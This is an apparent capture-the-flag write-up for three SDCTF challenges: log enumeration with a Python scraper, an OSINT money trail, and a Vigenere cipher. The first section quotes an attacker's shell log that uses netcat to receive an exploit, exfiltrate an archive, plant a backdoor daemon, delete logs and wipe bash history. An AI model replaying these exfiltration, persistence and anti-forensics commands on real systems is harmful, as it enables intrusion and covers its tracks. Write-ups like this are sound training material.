## Lots of Logs

### Challenge Description

As a professional logger, I made an extensive logger that logs all of the logs I log to the blog I blog so that no log goes unlogged. I post some logs to the log catalog on my log blog.

The page featured a few links to logs for example - https://logs.sdc.tf/logs/2022/3/9/Wed.log.

There wasn't anything intersting in the logs linked on the homepage. 

```
Welcome to LoggerOS 11.02.3 (GNU/Linux 4.7.8-23-generic)

john@logger:~# ./logger

Wed 03/09 07:20:31 START : ******** STARTING LOGGING *******
Wed 03/09 07:20:31 LOG   : 0 logs logged!
Wed 03/09 07:21:25 LOG   : 13 logs logged!
Wed 03/09 07:22:05 PROC  : Processing 13 logs! 
Wed 03/09 07:22:45 LOG   : 13 logs logged!
Wed 03/09 07:23:31 LOG   : 8 logs logged!
Wed 03/09 07:24:23 LOG   : 11 logs logged!
--- [SNIP] ---
```
{: file='Wed.log'}

There wasn't anything interesting in the logs, but we could view logs not linked from the home page by following the same format. 

### Solution

After testing some random dates, I noticed that the logs go back a few years. It would take forever to go though these manually, so I created a quick script to search though the logs for a flag. 


```python
import datetime
import requests

f = open("log.log", "w")
url = 'https://logs.sdc.tf/logs/'
req = requests.session()

# Format: 2021/12/15/Wed.log
week_days = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']

for year in range(2022,2015,-1):
    for month in range(1,13):
        for day in range(1,32):
            try:
                week = datetime.date(year,month,day).weekday()
            except: # error based on invalid day in month
                week = 0
            dow = week_days[week]
            log = f'{year}/{month}/{day}/{dow}.log'
        
            r = req.get(url + log)
            f.writelines(r.text)
            print(f'Trying: {log}  Response length: {len(r.text)}')
            #print(r.text)
            if "sdctf" in r.text:
                print(r.text)
                exit()
```

The flag wasn't found in any of the logs, so I saved all of the logs to a single file to dive into it further. 

```bash
zach$ grep ":~#" log.log | grep -v "/logger"
john@logger:~# nc -l 1337 > exploit
john@logger:~# chmod +x exploit
john@logger:~# ./exploit
```

After noticing the commands above I went back to the full log file to see what else was done around this commands. 

```shell
john@logger:~# nc -l 1337 > exploit
john@logger:~# chmod +x exploit
john@logger:~# ./exploit
# whoami
root
# ls
exploit  logs  site
# ls logs 
2016  2017  2018
# tar -cf data.tar.gz ~/logs
tar: Removing leading `/' from member names
tar: /home/john/data.tar.gz: file is the archive; not dumped
# nc -l 1337 < data.tar.gz
# rm -rf /home/john/logs/2018/6/10 /home/john/logs/2018/6/11 /home/john/logs/2018/6/12
# rm data.tar.gz
# mkdir /lib/network
# nc -l 1337 > /lib/network/daemon
# chmod +x /lib/network/daemon
# /lib/network/daemon
Success... running on port 1338
# nc logger.sdc.tf 1338
Pass: 82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d
ls /home/john
exploit  logs  site
^C
# rm exploit
# echo "" > .bash_history
# echo "" > ~/.bash_history
# exit
```

This was pretty interesting. I tried connecting to port 1338 and it was still open. All I had to do was use the same password that was found in the logs above.
```bash
zach$ echo "82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d" | nc logger.sdc.tf 1338
sdctf{b3tr4y3d_by_th3_l0gs_8a4dfd}
```

### Challenge Description

We've apprehended somebody suspected of purchasing SDCTF flags off an underground market. That said, this guy is small fry. We need to find the leaker and bring them to brutal justice!

Attached is an email we retrieved from his inbox. See if you can't figure out the boss of their operation.
Flag format is sdctf{...}

Attachmend: add link to github

### Solution
This was solved right after the event ended, but I thought I would still share. 

I started by analyzing the email file included in the challenge. There were two important parts that I started with. 

The main text of the email was encoded with base64. The text was in another lanuguage, but after tranlating with Google Tranlate I got the following message:
`Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. Cheap banner for the San Diego Cybersecurity Games. Be the winner of SDCTF. fast and convenient. Click below. You can also find us on PayPal or on the blockchain. 0xbad ... A43B ..... SDCTF {Forgery_bana} 3️⃣ ✳ ✳️ 👟 📙 👈 🔠 🖖 🐾 🃏 🕕 ❇ ❇ ❇️ ⬇ 🈷️ 🕜 ↘️ 🍕 👨 🌏 ◾️ 🌎 😸 🍄 ✳️ 🕡 🚛 👧 🔻 ♓️ 🔠 😭`

So from this text, we know that there should be another link included in the email.

I used on online tool to convert the base64 encoded png file that was also included in the email. <https://onlinepngtools.com/convert-base64-to-png>

There isn't anything intersting on the account page, but you can pivot from the account name limosheen. From the translated email we also know that the person of interest uses Paypal and some type of cryptocurrency.


The Paypal accounthttps://www.paypal.com/paypalme/limosheen

By searching for the address that was in the Paypal about section we can see all transactions.

From the challenge description, we know that we are looking for the boss. Always follow the money! By searching the address that the cryptocurrency to going to (`0x949213139D202115c8b878E8Af1F1D8949459f3f`) on twitter we find the "boss". This page also includes a base64 encoded flag.

Flag: `sdctf{You_Ever_Dance_With_the_Devil_In_the_Pale_Moonlight}`

### Challenge Description

My friend gave me another encrypted flag...I think they hate me! I heard them yell something about “Vinegar”, but I still don’t know what they’re talking about!
Ciphertext
{wbeyrjgewcfroggpesremvxgvefyrcmnnymxhdacgnnrwprhxpuyyaupbmskjrxfopr}

### Solution

From the challenge name it was obvious it was related to the Vigenere Cipher.

This cipher is basically a Ceasar Cipher with a different shift for each character based on the key.

There are a few online tools that I always try before diving into a more complicated solution. I used <https://www.guballa.de/vigenere-solver> for this challange to get the flag.
